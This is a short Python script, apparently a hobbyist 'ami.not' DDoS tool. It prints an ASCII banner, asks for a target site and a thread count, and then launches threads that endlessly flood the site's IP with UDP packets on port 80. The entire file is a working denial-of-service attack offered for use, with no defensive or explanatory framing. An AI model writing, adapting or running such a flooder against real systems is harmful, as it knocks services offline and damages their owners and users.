#Noob Editors
#Posy you mother Editor
from colorama import init, Fore
init()
from random import choice, randint
print("-----ami.not-----")
print(Fore.GREEN+'''
  
                   _               _
                  (_)             | |
    __ _ _ __ ___  _   _ __   ___ | |_
   / _` | '_ ` _ \| | | '_ \ / _ \| __|
  | (_| | | | | | | | | | | | (_) | |_
   \__,_|_| |_| |_|_| |_| |_|\___/ \__|''')
import time
import socket
import sys
import _thread
site = input("Enter your site url => ")
thread_count = input("Enter your thread => ")
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'virus32'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print("Packet Sent")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
